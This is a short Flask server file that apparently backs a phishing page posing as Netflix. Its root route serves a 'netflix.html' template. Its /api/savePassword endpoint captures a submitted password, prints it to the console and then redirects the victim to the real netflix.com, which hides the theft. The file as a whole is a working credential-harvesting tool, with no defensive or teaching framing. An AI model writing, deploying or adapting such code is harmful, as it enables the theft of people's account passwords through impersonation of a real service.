from flask import Flask, render_template, request, jsonify, redirect

app = Flask(__name__)

@app.route('/')
def index():
    #create a sub folder named template and move ur template into that folder then only it will work 
    return render_template('netflix.html')

@app.route('/api/savePassword', methods=['POST'])
def save_password():
    password = request.form.get('password')
    if password:
        try:
            # Print the password to the console
            print(f"Received password: {password}")
            return redirect("https://www.netflix.com")  # Indentation corrected
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    else:
        return jsonify({'error': 'No password provided'}), 400

if __name__ == '__main__':
    app.run(debug=True, port=4000)
